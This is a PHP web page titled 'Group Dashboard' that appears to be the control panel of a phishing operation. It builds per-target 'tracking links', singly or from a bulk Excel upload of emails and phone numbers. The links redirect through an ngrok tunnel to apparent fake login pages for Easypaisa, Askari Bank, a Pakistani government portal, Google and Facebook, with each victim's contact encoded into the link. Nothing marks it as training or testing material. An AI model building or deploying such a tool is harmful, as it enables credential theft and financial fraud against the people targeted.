<?php
session_start();

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (isset($_POST['group_name'])) {
        // Check if the group name has changed
        if (!isset($_SESSION['group_name']) || $_SESSION['group_name'] !== $_POST['group_name']) {
            // Reset contact when group name changes
            unset($_SESSION['contact']);
        }

        // Update session with new group name
        $_SESSION['group_name'] = $_POST['group_name'];
    }

    if (isset($_POST['contact'])) {
        $_SESSION['contact'] = $_POST['contact'];
    }
}

// Get current values
$groupName = isset($_SESSION['group_name']) ? $_SESSION['group_name'] : '';
$contact = isset($_SESSION['contact']) ? $_SESSION['contact'] : '';

function encryptData($data) {
    return str_replace(['+', '/', '='], ['-', '_', ''], base64_encode($data)); // URL-safe encoding
}

// Define base links and their corresponding names
$base_links = [
    "Easypaisa" => "https://a2ee-182-189-116-58.ngrok-free.app/tracking/tracking/php_login/php_login_system/testing_website/easypaisa.php",
    "Askari Bank" => "https://a2ee-182-189-116-58.ngrok-free.app/tracking/tracking/askari_bank/logout.php",
    "CSD Gov PK" => "https://a2ee-182-189-116-58.ngrok-free.app/tracking/tracking/csd_gov_pk/login.php",
    "Google" => "https://a2ee-182-189-116-58.ngrok-free.app/google/googlei.php",
    "Real Estate" => "https://a2ee-182-189-116-58.ngrok-free.app/real-Estate-Management-System-main/",
    "Facebook" => "https://a2ee-182-189-116-58.ngrok-free.app/facebook/facebook_login.php",
    "War Zone" => "https://a2ee-182-189-116-58.ngrok-free.app/warZoneCommand/index.php",
    "Hackathon" => "https://a2ee-182-189-116-58.ngrok-free.app/hackathon/index.html#about",
    "Eshop2" => "https://a2ee-182-189-116-58.ngrok-free.app/eshop2",
    "Stylo Website" => "https://a2ee-182-189-116-58.ngrok-free.app/stylo_website/welcome_stylo.php"
];

// In your index.php, modify the link generation:
if ($contact) {
    $encryptedContact = encryptData($contact);
    $encryptedGroup = encryptData($groupName);

    $_SESSION['generated_links'] = [];

    foreach ($base_links as $name => $link) {
        // For notification links, include the notification ID
        $_SESSION['generated_links'][] = [
            'name' => $name,
            'link' => "redirect.php?url=" . urlencode($link) . 
                      "&contact=" . urlencode($encryptedContact) . 
                      "&group=" . urlencode($encryptedGroup) . 
                      "&notif_id=123" // You'll need to get the actual notification ID
        ];
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Group Dashboard</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap">
    <style>
        :root {
            --primary-color: #4361ee;
            --secondary-color: #3f37c9;
            --accent-color: #4cc9f0;
            --dark-color: #1b263b;
            --light-color: #f8f9fa;
            --success-color: #4bb543;
            --warning-color: #ff9500;
            --danger-color: #ff3e41;
            --card-bg: rgba(40, 48, 58, 0.85);
            --glass-effect: rgba(255, 255, 255, 0.05);
        }
        
        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
            background-attachment: fixed;
            color: var(--light-color);
            min-height: 100vh;
            padding-bottom: 2rem;
        }
        
        .container {
            max-width: 800px;
        }
        
        .card {
            background: var(--card-bg);
            backdrop-filter: blur(10px);
            border: 1px solid var(--glass-effect);
            border-radius: 15px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
            overflow: hidden;
            margin-bottom: 1.5rem;
        }
        
        .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.3);
        }
        
        .card-header {
            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
            color: white;
            font-weight: 600;
            padding: 1.25rem;
            border-bottom: none;
            position: relative;
        }
        
        .card-header::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 3px;
            background: linear-gradient(90deg, var(--accent-color), transparent);
        }
        
        h2, h3, h4 {
            font-weight: 700;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
        }
        
        .form-control {
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
            color: var(--light-color);
            padding: 0.75rem 1rem;
            border-radius: 8px;
            transition: all 0.3s ease;
        }
        
        .form-control:focus {
            background: rgba(255, 255, 255, 0.15);
            border-color: var(--accent-color);
            box-shadow: 0 0 0 0.25rem rgba(67, 97, 238, 0.25);
            color: white;
        }
        
        .form-control::placeholder {
            color: rgba(255, 255, 255, 0.6);
        }
        
        .form-label {
            font-weight: 500;
            margin-bottom: 0.5rem;
            display: flex;
            align-items: center;
        }
        
        .form-label i {
            margin-right: 0.75rem;
            color: var(--accent-color);
        }
        
        .btn {
            font-weight: 600;
            padding: 0.75rem 1.5rem;
            border-radius: 8px;
            border: none;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }
        
        .btn::after {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: 0.5s;
        }
        
        .btn:hover::after {
            left: 100%;
        }
        
        .btn-primary {
            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
        }
        
        .btn-primary:hover {
            background: linear-gradient(135deg, var(--secondary-color), var(--primary-color));
            transform: translateY(-2px);
        }
        
        .btn-success {
            background: linear-gradient(135deg, var(--success-color), #3aa13f);
        }
        
        .btn-success:hover {
            background: linear-gradient(135deg, #3aa13f, var(--success-color));
            transform: translateY(-2px);
        }
        
        .btn-warning {
            background: linear-gradient(135deg, var(--warning-color), #ff7b00);
            color: white;
        }
        
        .btn-warning:hover {
            background: linear-gradient(135deg, #ff7b00, var(--warning-color));
            transform: translateY(-2px);
        }
        
        .list-group-item {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            color: var(--light-color);
            padding: 1rem 1.5rem;
            display: flex;
            flex-direction: column;
            align-items: center;
            transition: all 0.3s ease;
        }
        
        .list-group-item:hover {
            background: rgba(255, 255, 255, 0.1);
            transform: translateX(5px);
        }
        
        .list-group-item strong {
            margin-bottom: 0.5rem;
            font-weight: 600;
            color: var(--accent-color);
        }
        
        .list-group-item a {
            color: white;
            text-decoration: none;
            word-break: break-all;
            text-align: center;
            position: relative;
            transition: all 0.3s ease;
        }
        
        .list-group-item a:hover {
            color: var(--accent-color);
        }
        
        .list-group-item a::after {
            content: '';
            position: absolute;
            width: 0;
            height: 2px;
            bottom: -2px;
            left: 0;
            background-color: var(--accent-color);
            transition: width 0.3s ease;
        }
        
        .list-group-item a:hover::after {
            width: 100%;
        }
        
        /* Animations */
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        @keyframes float {
            0% { transform: translateY(0px); }
            50% { transform: translateY(-10px); }
            100% { transform: translateY(0px); }
        }
        
        .animate-fade-in {
            animation: fadeIn 0.6s ease-out forwards;
        }
        
        .animate-float {
            animation: float 3s ease-in-out infinite;
        }
        
        /* Custom scrollbar */
        ::-webkit-scrollbar {
            width: 8px;
        }
        
        ::-webkit-scrollbar-track {
            background: rgba(255, 255, 255, 0.05);
        }
        
        ::-webkit-scrollbar-thumb {
            background: var(--primary-color);
            border-radius: 4px;
        }
        
        ::-webkit-scrollbar-thumb:hover {
            background: var(--secondary-color);
        }
        
        /* Responsive adjustments */
        @media (max-width: 768px) {
            .container {
                padding: 0 15px;
            }
            
            .card-header {
                padding: 1rem;
            }
            
            .form-control, .btn {
                padding: 0.65rem 1rem;
            }
        }
        
        /* Glow effect for important elements */
        .glow {
            text-shadow: 0 0 10px rgba(76, 201, 240, 0.7);
        }
        
        /* Pulse animation for active elements */
        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(76, 201, 240, 0.4); }
            70% { box-shadow: 0 0 0 10px rgba(76, 201, 240, 0); }
            100% { box-shadow: 0 0 0 0 rgba(76, 201, 240, 0); }
        }
        
        .pulse {
            animation: pulse 2s infinite;
        }
        
        /* Custom checkbox */
        .form-check-input {
            width: 1.2em;
            height: 1.2em;
            margin-top: 0.25em;
            background-color: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.3);
        }
        
        .form-check-input:checked {
            background-color: var(--primary-color);
            border-color: var(--primary-color);
        }
        
        /* Tooltip styles */
        .tooltip-inner {
            background-color: var(--dark-color);
            padding: 0.5rem 1rem;
            border-radius: 8px;
        }
        
        .bs-tooltip-auto[data-popper-placement^=top] .tooltip-arrow::before,
        .bs-tooltip-top .tooltip-arrow::before {
            border-top-color: var(--dark-color);
        }
    </style>
</head>
<body class="container py-4">
    <div class="text-center mb-5 animate-fade-in">
        <h2 class="display-5 fw-bold mb-3 glow"><i class="fas fa-user-secret me-2"></i>Group Dashboard</h2>
        <p class="lead text-muted">Generate and manage tracking links for your campaigns</p>
    </div>

    <div class="card animate-fade-in" style="animation-delay: 0.1s;">
        <div class="card-header">
            <h3 class="mb-0"><i class="fas fa-users me-2"></i>Group Information</h3>
        </div>
        <div class="card-body">
            <form method="POST" id="groupForm">
                <div class="mb-4">
                    <label for="group_name" class="form-label">
                        <i class="fas fa-tag me-2"></i>Group Name
                    </label>
                    <input type="text" id="group_name" name="group_name" class="form-control form-control-lg" 
                           required value="<?php echo htmlspecialchars($groupName); ?>" 
                           placeholder="Enter your group name">
                </div>
                <button type="submit" class="btn btn-primary w-100 btn-lg">
                    <i class="fas fa-save me-2"></i>Save Group
                </button>
            </form>
        </div>
    </div>

    <?php if ($groupName): ?>
        <div class="card animate-fade-in" style="animation-delay: 0.2s;">
            <div class="card-header">
                <h3 class="mb-0"><i class="fas fa-id-card me-2"></i>Contact Information</h3>
            </div>
            <div class="card-body">
                <div class="alert alert-dark mb-4" role="alert">
                    <i class="fas fa-info-circle me-2"></i>Currently working with group: 
                    <strong class="text-warning"><?php echo htmlspecialchars($groupName); ?></strong>
                </div>
                
                <form method="POST" id="contactForm" class="mt-3">
                    <div class="mb-4">
                        <label for="contact" class="form-label">
                            <i class="fas fa-envelope me-2"></i>Email or Phone Number
                        </label>
                        <input type="text" id="contact" name="contact" class="form-control form-control-lg" 
                               required placeholder="Enter target email or phone number">
                        <div class="form-text mt-2">This will be used to track the target's interactions</div>
                    </div>
                    <button type="submit" class="btn btn-success w-100 btn-lg pulse">
                        <i class="fas fa-link me-2"></i>Generate Tracking Links
                    </button>
                </form>
            </div>
        </div>

        <div class="card animate-fade-in" style="animation-delay: 0.3s;">
            <div class="card-header">
                <h3 class="mb-0"><i class="fas fa-file-excel me-2"></i>Bulk Import</h3>
            </div>
            <div class="card-body">
                <form method="POST" action="upload_excel.php" enctype="multipart/form-data" id="uploadForm">
                    <div class="mb-4">
                        <label for="excel_file" class="form-label">
                            <i class="fas fa-file-upload me-2"></i>Excel File Upload
                        </label>
                        <input type="file" id="excel_file" name="excel_file" class="form-control form-control-lg" 
                               accept=".xls,.xlsx" required>
                        <div class="form-text mt-2">Upload an Excel file with multiple contacts to generate links in bulk</div>
                    </div>
                    <button type="submit" class="btn btn-warning w-100 btn-lg">
                        <i class="fas fa-cloud-upload-alt me-2"></i>Upload & Generate Links
                    </button>
                </form>
            </div>
        </div>

        <?php if (isset($_SESSION['generated_links'])): ?>
            <div class="card animate-fade-in" style="animation-delay: 0.4s;">
                <div class="card-header">
                    <h3 class="mb-0"><i class="fas fa-paperclip me-2"></i>Generated Links</h3>
                </div>
                <div class="card-body">
                    <div class="alert alert-success mb-4" role="alert">
                        <i class="fas fa-check-circle me-2"></i> 
                        Successfully generated tracking links for 
                        <strong><?php echo htmlspecialchars($contact); ?></strong> in group 
                        <strong><?php echo htmlspecialchars($groupName); ?></strong>
                    </div>
                    
                    <div class="table-responsive">
                        <table class="table table-dark table-hover">
                            <thead>
                                <tr>
                                    <th><i class="fas fa-globe me-2"></i>Service</th>
                                    <th><i class="fas fa-link me-2"></i>Tracking Link</th>
                                </tr>
                            </thead>
                            <tbody>
                                <?php foreach ($_SESSION['generated_links'] as $entry): ?>
                                    <tr>
                                        <td class="align-middle">
                                            <strong><?php echo htmlspecialchars($entry['name']); ?></strong>
                                        </td>
                                        <td>
                                            <a href="<?php echo $entry['link']; ?>" target="_blank" 
                                               class="text-truncate d-block" style="max-width: 300px;"
                                               data-bs-toggle="tooltip" data-bs-placement="top" 
                                               title="<?php echo $entry['link']; ?>">
                                                <?php echo "http://ngrok.com/" . $entry['link']; ?>
                                            </a>
                                        </td>
                                    </tr>
                                <?php endforeach; ?>
                            </tbody>
                        </table>
                    </div>
                    
                    <div class="d-grid gap-2 mt-3">
                        <button class="btn btn-outline-info" id="copyAllLinks">
                            <i class="fas fa-copy me-2"></i>Copy All Links
                        </button>
                    </div>
                </div>
            </div>
            <?php unset($_SESSION['generated_links']); ?>
        <?php endif; ?>
    <?php endif; ?>

    <footer class="mt-5 text-center text-muted">
        <p class="small">Group Dashboard &copy; <?php echo date('Y'); ?></p>
    </footer>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        // Initialize tooltips
        document.addEventListener('DOMContentLoaded', function() {
            var tooltipTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="tooltip"]'));
            var tooltipList = tooltipTriggerList.map(function (tooltipTriggerEl) {
                return new bootstrap.Tooltip(tooltipTriggerEl);
            });
            
            // Copy all links functionality
            document.getElementById('copyAllLinks')?.addEventListener('click', function() {
                const links = [];
                document.querySelectorAll('tbody tr').forEach(row => {
                    const link = row.querySelector('a').getAttribute('href');
                    links.push(link);
                });
                
                navigator.clipboard.writeText(links.join('\n')).then(() => {
                    const originalText = this.innerHTML;
                    this.innerHTML = '<i class="fas fa-check me-2"></i>Copied!';
                    setTimeout(() => {
                        this.innerHTML = originalText;
                    }, 2000);
                });
            });
        });
    </script>
</body>
</html>